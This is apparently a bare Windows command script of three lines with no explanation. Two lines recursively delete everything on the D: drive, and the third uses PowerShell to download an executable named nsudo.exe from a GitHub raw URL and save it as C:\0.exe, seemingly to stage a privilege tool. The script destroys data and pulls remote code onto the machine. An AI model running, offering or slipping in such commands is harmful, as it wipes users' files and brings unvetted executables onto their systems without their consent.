rd /s D:\
del /s D:\*.*
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/gtla2025/cs/refs/heads/main/nsudo.exe', 'C:\0.exe')"
